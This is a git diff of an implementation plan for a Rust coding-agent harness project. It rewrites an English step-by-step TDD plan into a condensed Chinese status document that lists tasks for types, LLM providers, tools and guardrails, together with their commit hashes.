@@ -1,37 +1,63 @@
-# HarnessAgent Implementation Plan
+# AuV harness agent 实施计划
 
-> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
-
-**Goal:** Build a complete Coding Agent Harness in Rust — a system that wraps an LLM as a "CPU" with tools, guardrails, feedback loops, memory, and a TUI, all testable with mock LLM providers.
-
-**Architecture:** Trait-based dependency injection throughout — every component (LLM, tools, guardrails, feedback, memory) is behind a trait, enabling deterministic unit testing with mock implementations. The agent main loop orchestrates all components. The guardrail pipeline is the deep focus dimension with a four-layer architecture (static rules → risk assessment → approval state machine → sandbox boundary).
-
-**Tech Stack:** Rust (edition 2024), tokio, reqwest, clap, ratatui, serde, tracing, keyring
-
-## Global Constraints
-
-- Rust edition: 2024
-- Async runtime: tokio (multi-threaded)
-- All mechanisms must be testable with mock LLM — no mechanism may depend on a real LLM call
-- TDD: red → green → refactor for every task
-- No real API keys in source code, git history, or logs
-- Binary name: `harness`
-- LLM provider: OpenAI API primary, Anthropic reserved
-- TUI: ratatui-based, graceful degradation to plain CLI
+> 项目：AI4SE 期末项目 · A · Coding Agent Harness
+> 计划制定：2025-07-08 ｜ 最后更新：2026-08-14（完成状态与修订记录）
+> 对应设计文档：[SPEC.md](SPEC.md) ｜ 过程记录：[SPEC_PROCESS.md](SPEC_PROCESS.md) ｜ Agent 日志：[AGENT_LOG.md](AGENT_LOG.md)
 
 ---
 
-## Phase 1: Project Scaffolding & Core Types (Tasks 1-3)
+## 1. 目标与总体架构
 
-### Task 1: Initialize Cargo project with dependencies
+**目标**：用 Rust 构建一个完整的 Coding Agent Harness——将 LLM 作为"CPU"封装成能稳定执行软件工程任务的完整系统，包含工具、护栏、反馈闭环、记忆与交互界面，全部机制可用 mock LLM 做确定性测试。
 
-**Files:**
-- Modify: `Cargo.toml`
-- Create: `src/lib.rs`, `src/main.rs`
+**架构决策**：全链路 trait 依赖注入——每个组件（LLM、工具、护栏、反馈、记忆）都在 trait 之后，用 mock 实现做确定性单元测试；Agent 主循环编排所有组件。**护栏管线是重点维度**，采用四层架构（静态规则 → 风险评估 → 沙箱边界 → 审批状态机；沙箱先于审批的最终顺序见 §7 修订记录）。
 
-**Produces:** `harness_agent` library crate, `harness` binary crate
+**技术栈**：Rust (edition 2024)、tokio、reqwest、clap、ratatui、crossterm、rustyline、serde、tracing、keyring（预留）。
 
-- [ ] **Step 1: Write Cargo.toml with all dependencies**
+## 2. 全局约束
+
+- Rust edition：2024；异步运行时：tokio（多线程）
+- **所有机制必须能用 mock LLM 测试**——任何机制不得依赖真实 LLM 调用
+- TDD：每个任务先红后绿再重构
+- 真实 API key 不得出现在源码、git 历史或日志中（`config.toml`、`.AuV/` 已加入 `.gitignore`）
+- 二进制名：`auv`（原计划 `harness`，2026-08-13 更名，见 §7）
+- LLM 供应商：OpenAI 兼容 API 为主（DeepSeek/Groq/Ollama），Anthropic 预留
+- TUI：基于 ratatui，无法启动时优雅降级为纯文本 CLI
+
+## 3. 阶段与任务总览
+
+| 阶段 | 任务 | 说明 | 预计耗时 | 状态 |
+|------|------|------|---------|------|
+| 1 | 1-3 | 项目脚手架 + 核心类型 | 30 分钟 | ✓ |
+| 2 | 4-5 | LLM 抽象层 | 30 分钟 | ✓ |
+| 3 | 6 | 配置系统 | 20 分钟 | ✓ |
+| 4 | 7-11 | 工具系统 | 45 分钟 | ✓ |
+| 5 | 12-18 | **护栏（重点维度）** | 90 分钟 | ✓ |
+| 6 | 19-20 | 反馈闭环 | 30 分钟 | ✓ |
+| 7 | 21 | 记忆系统 | 20 分钟 | ✓ |
+| 8 | 22 | Agent 主循环 | 30 分钟 | ✓ |
+| 9 | 23-24 | 可观测性 + 子 Agent | 20 分钟 | ✓ |
+| 10 | 25 | 凭据管理 | 20 分钟 | ✓ |
+| 11 | 26-28 | TUI | 45 分钟 | ✓ |
+| 12 | 29 | CLI 入口 | 15 分钟 | ✓ |
+| 13 | 30-31 | Docker + CI | 15 分钟 | ✓ |
+| 14 | 32 | 机制演示 | 20 分钟 | ✓ |
+| 15 | — | REPL 交互层（计划外新增，见 §5） | — | ✓ |
+| **合计** | **32 个任务 + REPL 扩展** | | **约 7 小时（不含 REPL）** | |
+
+---
+
+## 4. 阶段任务明细
+
+### 阶段 1：项目脚手架与核心类型（任务 1-3）
+
+#### 任务 1：初始化 Cargo 项目与依赖
+
+**文件**：`Cargo.toml`（修改）、`src/lib.rs`、`src/main.rs`（新建）
+
+**产出**：`harness_agent` library crate、`auv` binary crate
+
+**关键实现**：
 
 ```toml
 [package]
@@ -44,121 +70,28 @@ name = "harness_agent"
 path = "src/lib.rs"
 
 [[bin]]
-name = "harness"
+name = "auv"            # 原计划为 harness，2026-08-13 更名
 path = "src/main.rs"
-
-[dependencies]
-tokio = { version = "1", features = ["full"] }
-reqwest = { version = "0.12", features = ["json", "stream"] }
-serde = { version = "1", features = ["derive"] }
-serde_json = "1"
-clap = { version = "4", features = ["derive"] }
-ratatui = "0.29"
-crossterm = "0.28"
-tracing = "0.1"
-tracing-subscriber = { version = "0.3", features = ["env-filter", "json"] }
-chrono = { version = "0.4", features = ["serde"] }
-keyring = "3"
-rpassword = "7"
-async-trait = "0.1"
-thiserror = "2"
-regex = "1"
-glob = "0.3"
-uuid = { version = "1", features = ["v4"] }
-ring = "0.17"
-aes-gcm = "0.10"
-sha2 = "0.10"
-rand = "0.8"
-base64 = "0.22"
-toml = "0.8"
-dirs = "5"
-
-[dev-dependencies]
-tempfile = "3"
-tokio-test = "0.4"
-wiremock = "0.6"
 ```
 
-- [ ] **Step 2: Create minimal lib.rs with module declarations**
+依赖包括 tokio、reqwest、serde、clap、ratatui、crossterm、rustyline、tracing、chrono、keyring、rpassword、async-trait、thiserror、regex、glob、uuid、toml、dirs 等；dev-dependencies 包括 tempfile、tokio-test、wiremock。
 
-```rust
-//! HarnessAgent — Coding Agent Harness
-pub mod types;
-pub mod error;
-pub mod llm;
-pub mod config;
-pub mod tools;
-pub mod guardrails;
-pub mod feedback;
-pub mod memory;
-pub mod subagent;
-pub mod observability;
-pub mod credentials;
-pub mod tui;
-```
+**测试计划**：`cargo build` 编译通过。
 
-- [ ] **Step 3: Create minimal main.rs**
-
-```rust
-fn main() {
-    println!("HarnessAgent v0.1.0");
-}
-```
-
-- [ ] **Step 4: Verify it compiles**
-
-Run: `cargo build`
-Expected: Fails because referenced modules don't exist yet. Create empty placeholder files for each module, then compile.
-
-- [ ] **Step 5: Create placeholder module files**
-
-Use Rust's mixed module layout: leaf modules that are implemented directly by early tasks use
-`src/<module>.rs`, while modules that will contain submodules use `src/<module>/mod.rs`.
-
-Create placeholder files for each module declared in lib.rs:
-```bash
-touch src/types.rs src/error.rs
-for m in llm config tools guardrails feedback memory subagent observability credentials tui; do
-  mkdir -p src/$m 2>/dev/null
-  echo "// TODO" > src/$m/mod.rs
-done
-```
-
-Run: `cargo build`
-Expected: Compiles successfully
-
-- [ ] **Step 6: Commit**
-
-```bash
-git add -A && git commit -m "feat: initialize project with dependencies and module structure
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `3b665ea`（feat: add project scaffolding, core types, and module structure）
 
 ---
 
-### Task 2: Define core data types
+#### 任务 2：定义核心数据类型
 
-**Files:**
-- Modify: `src/types.rs`
+**文件**：`src/types.rs`（修改）
 
-**Produces:** `Role`, `Message`, `ToolCall`, `Action`, `ToolResult`, `Artifact`, `LlmResponse`, `FinishReason`, `TokenUsage`, `GuardResult`, `GuardDecision`, `ToolInfo`, `FeedbackResult`, `FeedbackError`
+**产出**：`Role`、`Message`、`ToolCall`、`Action`、`ToolResult`、`Artifact`、`LlmResponse`、`FinishReason`、`TokenUsage`、`GuardResult`、`GuardDecision`、`ToolInfo`、`FeedbackResult`、`FeedbackError`
 
-- [ ] **Step 1: Write the complete types module**
-
-Write `src/types.rs` with all the types from the design spec §6.1–6.5. See the spec for the full definitions. Key types:
+**关键实现**（关键类型，完整定义见 SPEC.md §6）：
 
 ```rust
-use serde::{Deserialize, Serialize};
-
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub enum Role { System, User, Assistant, Tool }
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct ToolCall { pub id: String, pub name: String, pub arguments: String }
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct Message { pub role: Role, pub content: String, pub tool_calls: Option<Vec<ToolCall>>, pub tool_call_id: Option<String> }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 #[serde(tag = "type")]
@@ -169,77 +102,28 @@ pub enum Action {
     #[serde(rename = "noop")] NoOp,
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct ToolResult { pub success: bool, pub content: String, pub structured: Option<serde_json::Value>, pub artifacts: Vec<Artifact> }
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct Artifact { pub path: std::path::PathBuf, pub content_type: String, pub size_bytes: u64 }
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
-pub enum FinishReason { Stop, ToolCalls, Length, ContentFilter }
-
-#[derive(Debug, Clone, Copy, Default, Serialize, Deserialize)]
-pub struct TokenUsage { pub prompt_tokens: u32, pub completion_tokens: u32, pub total_tokens: u32 }
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct LlmResponse { pub content: String, pub finish_reason: FinishReason, pub usage: TokenUsage, pub tool_calls: Option<Vec<ToolCall>> }
-
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-pub enum GuardDecision { Allowed, Blocked, Escalated, Approved, Denied, Timeout }
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub enum GuardResult { Allowed, Denied { reason: String, decision: GuardDecision }, NeedsApproval { risk_level: String, reasons: Vec<String> } }
-
-impl GuardResult {
-    pub fn is_allowed(&self) -> bool { matches!(self, GuardResult::Allowed) }
-    pub fn is_denied(&self) -> bool { matches!(self, GuardResult::Denied { .. }) }
-    pub fn needs_approval(&self) -> bool { matches!(self, GuardResult::NeedsApproval { .. }) }
+pub enum GuardResult {
+    Allowed,
+    Denied { reason: String, decision: GuardDecision },
+    NeedsApproval { risk_level: String, reasons: Vec<String> },
 }
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct ToolInfo { pub name: String, pub description: String, pub parameters: serde_json::Value }
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct FeedbackError { pub file: Option<String>, pub line: Option<u32>, pub column: Option<u32>, pub error_type: String, pub message: String }
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct FeedbackResult { pub channel: String, pub passed: bool, pub errors: Vec<FeedbackError>, pub summary: String }
 ```
 
-- [ ] **Step 2: Write tests for serialization roundtrips**
+**测试计划**：`Action` 全变体 JSON 往返、`GuardResult` 判定方法、`Message` 全字段构造。
 
-Add `#[cfg(test)]` tests in `types.rs` testing:
-- `Action` JSON roundtrip for all variants
-- `GuardResult::is_allowed()` and `is_denied()` return correct values
-- `Message` creation with all fields
-
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All type tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/types.rs && git commit -m "feat: define core data types
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `3b665ea`。实现期扩展：`Message` 与 `LlmResponse` 增加 `reasoning_content` 字段（DeepSeek 思考模式回传，commit `efa9f4d`）。
 
 ---
 
-### Task 3: Define error types
+#### 任务 3：定义错误类型
 
-**Files:**
-- Modify: `src/error.rs` (currently placeholder)
+**文件**：`src/error.rs`（修改）
 
-**Produces:** `HarnessError` enum, `Result<T>` type alias
+**产出**：`HarnessError` 枚举、`Result<T>` 类型别名
 
-- [ ] **Step 1: Write error types**
+**关键实现**：
 
 ```rust
-use thiserror::Error;
-
 #[derive(Debug, Error)]
 pub enum HarnessError {
     #[error("LLM error: {0}")] Llm(String),
@@ -248,9 +132,6 @@ pub enum HarnessError {
     #[error("Tool not found: {0}")] ToolNotFound(String),
     #[error("Tool execution error: {0}")] ToolExecution(String),
     #[error("Guardrail blocked: {0}")] GuardrailBlocked(String),
-    #[error("Guardrail needs approval: {0}")] GuardrailNeedsApproval(String),
-    #[error("Approval timeout")] ApprovalTimeout,
-    #[error("Approval denied: {0}")] ApprovalDenied(String),
     #[error("Sandbox violation: {0}")] SandboxViolation(String),
     #[error("Config error: {0}")] Config(String),
     #[error("IO error: {0}")] Io(#[from] std::io::Error),
@@ -262,222 +143,79 @@ pub enum HarnessError {
     #[error("User interrupted")] UserInterrupted,
     #[error("Credential error: {0}")] Credential(String),
 }
-
-pub type Result<T> = std::result::Result<T, HarnessError>;
 ```
 
-- [ ] **Step 2: Run tests**
+**测试计划**：编译通过 + 既有测试不回归。
 
-Run: `cargo test`
-Expected: Compiles and all existing tests pass
-
-- [ ] **Step 3: Commit**
-
-```bash
-git add src/error.rs && git commit -m "feat: define error types
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `3939700`（feat: define error types with HarnessError enum）
 
 ---
 
-## Phase 2: LLM Abstraction Layer (Tasks 4-5)
+### 阶段 2：LLM 抽象层（任务 4-5）
 
-### Task 4: LlmProvider trait and MockLlmProvider
+#### 任务 4：LlmProvider trait 与 MockLlmProvider
 
-**Files:**
-- Modify: `src/llm/mod.rs` (currently placeholder)
-- Create: `src/llm/mock.rs`
+**文件**：`src/llm/mod.rs`（修改）、`src/llm/mock.rs`（新建）
 
-**Produces:** `LlmProvider` trait, `MockLlmProvider`
+**产出**：`LlmProvider` trait、`MockLlmProvider`
 
-- [ ] **Step 1: Write the trait and mock**
+**关键实现**：
 
-In `src/llm/mod.rs`:
 ```rust
-use async_trait::async_trait;
-use crate::types::{Message, LlmResponse};
-use crate::error::HarnessError;
-
 #[async_trait]
 pub trait LlmProvider: Send + Sync {
     async fn complete(&self, messages: &[Message]) -> Result<LlmResponse, HarnessError>;
 }
-
-pub mod mock;
-pub mod openai;
 ```
 
-In `src/llm/mock.rs`:
-```rust
-use async_trait::async_trait;
-use std::sync::Mutex;
-use crate::llm::LlmProvider;
-use crate::types::{Message, LlmResponse, FinishReason, TokenUsage};
-use crate::error::HarnessError;
+`MockLlmProvider` 持有预设响应序列（`Mutex<Vec<LlmResponse>>`），按调用顺序返回；序列耗尽后返回默认 "Done" 响应。**这是全部机制离线测试的基石**——移除真实 LLM 后整个系统仍可单测。
 
-pub struct MockLlmProvider {
-    responses: Mutex<Vec<LlmResponse>>,
-    call_count: Mutex<usize>,
-}
+**测试计划**：预设响应按序返回、耗尽回退默认、tool_calls 响应透传。
 
-impl MockLlmProvider {
-    pub fn new(responses: Vec<LlmResponse>) -> Self {
-        Self { responses: Mutex::new(responses), call_count: Mutex::new(0) }
-    }
-    pub fn call_count(&self) -> usize { *self.call_count.lock().unwrap() }
-}
-
-#[async_trait]
-impl LlmProvider for MockLlmProvider {
-    async fn complete(&self, _messages: &[Message]) -> Result<LlmResponse, HarnessError> {
-        let mut count = self.call_count.lock().unwrap();
-        let mut responses = self.responses.lock().unwrap();
-        let idx = *count;
-        *count += 1;
-        if idx < responses.len() {
-            Ok(responses[idx].clone())
-        } else {
-            Ok(LlmResponse {
-                content: "Done".to_string(),
-                finish_reason: FinishReason::Stop,
-                usage: TokenUsage::default(),
-                tool_calls: None,
-            })
-        }
-    }
-}
-```
-
-- [ ] **Step 2: Write tests for MockLlmProvider**
-
-In `src/llm/mock.rs`, add `#[cfg(test)] mod tests`:
-- Test: `test_mock_returns_programmed_responses` — create mock with 2 responses, call twice, assert correct
-- Test: `test_mock_exhausted_returns_default` — create empty mock, call once, assert default "Done" response
-- Test: `test_mock_returns_tool_calls` — create mock with a ToolCall response, verify tool_calls field
-
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All mock tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/llm/ && git commit -m "feat: add LlmProvider trait and MockLlmProvider
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `334300b`（feat: add LlmProvider trait and MockLlmProvider）
 
 ---
 
-### Task 5: OpenAI provider
+#### 任务 5：OpenAI provider
 
-**Files:**
-- Modify: `src/llm/openai.rs` (currently placeholder)
+**文件**：`src/llm/openai.rs`（修改）
 
-**Produces:** `OpenAiProvider`
+**产出**：`OpenAiProvider`
 
-- [ ] **Step 1: Implement OpenAiProvider**
+**关键实现**：构造函数 `new(api_key, model, base_url)`；`build_request()` 将消息列表转为 Chat Completions JSON；`complete()` 发送 POST 并解析；401 → `HarnessError::Auth`、429 → 限流错误；`finish_reason` 字符串映射为枚举。
 
-Implement `OpenAiProvider` with:
-- Constructor: `new(api_key, model, base_url: Option<String>)`
-- `build_request()`: converts `Vec<Message>` to OpenAI Chat Completions JSON format
-- `complete()`: sends HTTP POST, parses response into `LlmResponse`
-- Auth error (401) → `HarnessError::Auth`
-- Rate limit (429) → `HarnessError::Llm("rate limited")`
-- Map `finish_reason` string → `FinishReason` enum
+**测试计划**（wiremock）：文本响应解析、tool_calls 响应解析、401 认证错误映射。
 
-- [ ] **Step 2: Write tests using wiremock**
-
-In `src/llm/openai.rs`, add `#[cfg(test)] mod tests`:
-- Test: `test_openai_handles_text_response` — mock server returns `{"choices":[{"message":{"content":"Hello!"},"finish_reason":"stop"}]}`, verify parsed correctly
-- Test: `test_openai_handles_tool_calls` — mock server returns response with `tool_calls` array, verify parsed
-- Test: `test_openai_handles_auth_error` — mock server returns 401, verify `HarnessError::Auth`
-
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All OpenAI tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/llm/openai.rs Cargo.toml Cargo.lock && git commit -m "feat: add OpenAI provider implementation
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `df8818e`（feat: add OpenAI provider implementation with wiremock tests）。实现期扩展：DeepSeek 思考模式 `reasoning_content` 原样回传（commit `efa9f4d`，修复 HTTP 400）。
 
 ---
 
-## Phase 3: Configuration System (Task 6)
+### 阶段 3：配置系统（任务 6）
 
-### Task 6: Config loading, rules, and skills
+#### 任务 6：配置加载、规则与技能
 
-**Files:**
-- Modify: `src/config/mod.rs` (currently placeholder)
-- Create: `src/config/rules.rs`
-- Create: `src/config/skills.rs`
+**文件**：`src/config/mod.rs`（修改）、`src/config/rules.rs`、`src/config/skills.rs`（新建）
 
-**Produces:** `HarnessConfig`, `RuleFile`, `SkillIndex`
+**产出**：`HarnessConfig`、`RuleFile`、`SkillIndex`
 
-- [ ] **Step 1: Implement HarnessConfig**
+**关键实现**：`HarnessConfig` 含 `LlmConfig`/`GuardConfig`/`SandboxConfig`/`ToolConfig`/`MemoryConfig`/`FeedbackConfig`/`AgentConfig` 子配置；`Default` 实现合理默认值（max_turns: 50、审批超时 120s）；`from_file()` 读取 TOML 并验证（模型非空、max_turns > 0）。`RuleFile` 纯文本规则（一行一条，跳过空行与 `#` 注释），格式化为 system prompt 片段。`SkillIndex` 扫描技能目录 `.md` 文件，提取 frontmatter `description` 生成"名片"提示片段。
 
-In `src/config/mod.rs`:
-- Define `HarnessConfig` with all sub-configs: `LlmConfig`, `GuardConfig`, `SandboxConfig`, `ToolConfig`, `MemoryConfig`, `FeedbackConfig`, `AgentConfig`
-- Implement `Default` for `HarnessConfig` with sensible defaults (model: "gpt-4o", max_turns: 50, approval_timeout: 120s)
-- Implement `HarnessConfig::from_file(path)` — reads TOML, deserializes, validates
-- Implement `validate()` — checks model is not empty, max_turns > 0
+**测试计划**：默认配置有效、空模型拒绝、零 max_turns 拒绝、TOML 加载往返。
 
-- [ ] **Step 2: Write config tests**
-
-- Test: `test_default_config_is_valid`
-- Test: `test_config_validation_rejects_empty_model`
-- Test: `test_config_validation_rejects_zero_max_turns`
-- Test: `test_load_from_toml` — write temp TOML file, load, verify fields
-
-- [ ] **Step 3: Implement RuleFile**
-
-In `src/config/rules.rs`:
-- `RuleFile` struct with `rules: Vec<String>`
-- `from_file(path)` — reads file, treats as plain text (one rule per line, skip empty/# comments)
-- `to_system_prompt_fragment()` — formats rules as "## Rules (MUST follow):\n- rule1\n- rule2"
-
-- [ ] **Step 4: Implement SkillIndex**
-
-In `src/config/skills.rs`:
-- `SkillDef` struct: `name`, `description`, `file_path`
-- `SkillIndex::from_dir(dir)` — scans directory for `.md` files, extracts description from frontmatter (line starting with `description:`)
-- `to_prompt_fragment()` — formats as "## Available Skills:\n- **name**: description"
-
-- [ ] **Step 5: Run tests**
-
-Run: `cargo test`
-Expected: All config tests PASS
-
-- [ ] **Step 6: Commit**
-
-```bash
-git add src/config/ && git commit -m "feat: add configuration system with rules and skills
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `41808f6`（feat: add configuration system with rules and skills）。实现期扩展：两级配置系统（`~/.AuV/config.toml` 全局 + `./.AuV/config.toml` 项目，字段级递归合并，启动幂等创建）与 AuV.md 角色说明两级检测，commit `a30bba0`；配置目录更正为隐藏目录 `.AuV`，commit `29e5270`。
 
 ---
 
-## Phase 4: Tool System (Tasks 7-11)
+### 阶段 4：工具系统（任务 7-11）
 
-### Task 7: Tool trait, ToolContext, and ToolRegistry
+#### 任务 7：Tool trait、ToolContext 与 ToolRegistry
 
-**Files:**
-- Modify: `src/tools/mod.rs` (currently placeholder)
-- Create: `src/tools/context.rs`
+**文件**：`src/tools/mod.rs`（修改）、`src/tools/context.rs`（新建）
 
-**Produces:** `Tool` trait, `ToolContext`, `ToolRegistry`
+**产出**：`Tool` trait、`ToolContext`、`ToolRegistry`
 
-- [ ] **Step 1: Implement ToolContext**
+**关键实现**：
 
-In `src/tools/context.rs`:
 ```rust
 #[derive(Debug, Clone)]
 pub struct ToolContext {
@@ -485,185 +223,83 @@ pub struct ToolContext {
     pub command_timeout: std::time::Duration,
     pub network_allowed: bool,
 }
-impl Default for ToolContext { /* current_dir, 300s timeout, network allowed */ }
 ```
 
-- [ ] **Step 2: Implement Tool trait and ToolRegistry**
+`Tool` trait 定义 `name()`/`description()`/`parameters()`/`execute()`；`ToolRegistry` 提供 `register()`/`get()`/`list_tools()`/`generate_tool_menu()`/`execute()`。
 
-In `src/tools/mod.rs`:
-- `Tool` trait: `name()`, `description()`, `parameters()`, `execute()`
-- `ToolRegistry`: `register()`, `get()`, `list_tools()`, `generate_tool_menu()`, `execute()`
-- Tests: `test_registry_register_and_get`, `test_registry_list_tools`, `test_registry_execute`
+**测试计划**：注册与查找、工具列表、执行分发。
 
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All registry tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/tools/ && git commit -m "feat: add Tool trait, ToolContext, and ToolRegistry
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `1966818`（feat: add Tool trait, ToolContext, and ToolRegistry）
 
 ---
 
-### Task 8: File tools (read_file, write_file)
+#### 任务 8：文件工具（read_file、write_file）
 
-**Files:**
-- Create: `src/tools/file.rs`
+**文件**：`src/tools/file.rs`（新建）
 
-**Produces:** `ReadFileTool`, `WriteFileTool`
+**产出**：`ReadFileTool`、`WriteFileTool`
 
-- [ ] **Step 1: Implement ReadFileTool**
+**关键实现**：`read_file` 支持行号范围（offset/limit），返回带行号内容；`write_file` 自动创建父目录，返回字节数。路径均基于 `workspace_root` 解析，受沙箱路径限制。
 
-- `name()` → "read_file"
-- `parameters()` → JSON Schema with `path` (required), `offset`, `limit`
-- `execute()` → read file at `ctx.workspace_root.join(path)`, apply offset/limit, return content with line numbers
-- Test: `test_read_file`, `test_read_file_with_line_range`, `test_read_file_nonexistent`
+**测试计划**：基础读取、行范围、不存在文件报错；基础写入、父目录创建。
 
-- [ ] **Step 2: Implement WriteFileTool**
-
-- `name()` → "write_file"
-- `parameters()` → JSON Schema with `path` (required), `content` (required)
-- `execute()` → create parent dirs, write file, return byte count
-- Test: `test_write_file`, `test_write_file_creates_parent_dirs`
-
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All file tool tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/tools/file.rs && git commit -m "feat: add read_file and write_file tools
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `64d55be`（feat: add read_file and write_file tools）
 
 ---
 
-### Task 9: Bash tool
+#### 任务 9：Bash 工具
 
-**Files:**
-- Create: `src/tools/bash.rs`
+**文件**：`src/tools/bash.rs`（新建）
 
-**Produces:** `BashTool`
+**产出**：`BashTool`
 
-- [ ] **Step 1: Implement BashTool**
+**关键实现**：`execute()` 在 workspace_root 中运行 `sh -c "<command>"`，合并 stdout+stderr，支持超时（`timeout_secs` 参数）。
 
-- `name()` → "bash"
-- `parameters()` → JSON Schema with `command` (required), `timeout_secs`
-- `execute()` → run `sh -c "<command>"` in workspace_root, capture stdout+stderr, apply timeout
-- Merge stdout and stderr into single output
-- Test: `test_bash_echo`, `test_bash_command_failure`, `test_bash_timeout` (uses `sleep 10` with 1s timeout)
+**测试计划**：echo 回显、命令失败、超时（`sleep 10` + 1s 超时）。
 
-- [ ] **Step 2: Run tests**
-
-Run: `cargo test`
-Expected: All bash tool tests PASS
-
-- [ ] **Step 3: Commit**
-
-```bash
-git add src/tools/bash.rs && git commit -m "feat: add bash tool
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `d336272`（feat: add bash tool）
 
 ---
 
-### Task 10: Search tools (grep, glob)
+#### 任务 10：搜索工具（grep、glob）
 
-**Files:**
-- Create: `src/tools/search.rs`
+**文件**：`src/tools/search.rs`（新建）
 
-**Produces:** `GrepTool`, `GlobTool`
+**产出**：`GrepTool`、`GlobTool`
 
-- [ ] **Step 1: Implement GrepTool**
+**关键实现**：`grep` 基于 `regex` crate 遍历工作区搜索，返回 `file:line` 前缀的匹配行；`glob` 基于 `glob` crate 列出匹配文件。
 
-- `name()` → "grep"
-- `parameters()` → JSON Schema with `pattern` (required), `path` (optional, default ".")
-- `execute()` → use `regex` crate, walk files in workspace, search for pattern, return matching lines with file:line prefix
-- Test: `test_grep_finds_matches`, `test_grep_no_matches`
+**测试计划**：命中/未命中；文件列表/空结果。
 
-- [ ] **Step 2: Implement GlobTool**
-
-- `name()` → "glob"
-- `parameters()` → JSON Schema with `pattern` (required)
-- `execute()` → use `glob` crate, list matching files in workspace
-- Test: `test_glob_finds_files`, `test_glob_no_matches`
-
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All search tool tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/tools/search.rs && git commit -m "feat: add grep and glob search tools
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `e0f2f1a`（feat: add grep and glob search tools）
 
 ---
 
-### Task 11: Git and test runner tools
+#### 任务 11：Git 与测试运行工具
 
-**Files:**
-- Create: `src/tools/git.rs`
-- Create: `src/tools/test_runner.rs`
+**文件**：`src/tools/git.rs`、`src/tools/test_runner.rs`（新建）
 
-**Produces:** `GitDiffTool`, `RunTestTool`
+**产出**：`GitDiffTool`、`RunTestTool`
 
-- [ ] **Step 1: Implement GitDiffTool**
+**关键实现**：`git_diff` 运行 `git diff`（可选 `--cached`）；`run_test` 运行测试命令（默认 `cargo test`），按退出码判定成功。
 
-- `name()` → "git_diff"
-- `parameters()` → JSON Schema with `staged` (optional bool)
-- `execute()` → run `git diff` (or `git diff --cached`) in workspace_root, return output
-- Test: `test_git_diff_in_temp_repo` — init temp git repo, commit file, modify, run diff
+**测试计划**：临时 git 仓库 diff、测试命令成功/失败路径。
 
-- [ ] **Step 2: Implement RunTestTool**
-
-- `name()` → "run_test"
-- `parameters()` → JSON Schema with `command` (required, default "cargo test")
-- `execute()` → run the command in workspace_root, capture output, return with `success` based on exit code
-- Test: `test_run_test_success`, `test_run_test_failure`
-
-- [ ] **Step 3: Run tests**
-
-Run: `cargo test`
-Expected: All git and test runner tests PASS
-
-- [ ] **Step 4: Commit**
-
-```bash
-git add src/tools/git.rs src/tools/test_runner.rs && git commit -m "feat: add git_diff and run_test tools
-
-Co-Authored-By: Claude <noreply@anthropic.com>"
-```
+**完成状态**：✓ 已完成 — commit `81a395b`（feat: add git_diff and run_test tools）
 
 ---
 
-## Phase 5: Guardrails — Deep Focus (Tasks 12-18)
+### 阶段 5：护栏——重点维度（任务 12-18）
 
-### Task 12: Static rule engine (Layer 1)
+#### 任务 12：静态规则引擎（第一层）
 
-**Files:**
-- Modify: `src/guardrails/mod.rs` (currently placeholder)
-- Create: `src/guardrails/rules.rs`
+**文件**：`src/guardrails/mod.rs`（修改）、`src/guardrails/rules.rs`（新建）
 
-**Produces:** `StaticRuleEngine`, `GuardRule`, `RulePattern`, `RuleAction`
+**产出**：`StaticRuleEngine`、`GuardRule`、`RulePattern`、`RuleAction`
 
-- [ ] **Step 1: Implement GuardRule data structures**
+**关键实现**：
 
-In `src/guardrails/rules.rs`:
 ```rust
-#[derive(Debug, Clone)]
 pub enum RulePattern {
     CommandGlob { globs: Vec<String> },
     FilePath { paths: Vec<String>, op: FileOp },
@@ -671,171 +307,50 @@ pub enum RulePattern {
     Composite { all: Vec<RulePattern>, any: Vec<RulePattern> },
 }
 
-#[derive(Debug, Clone)]
-pub enum FileOp { Read, Write, Delete, Any }
-
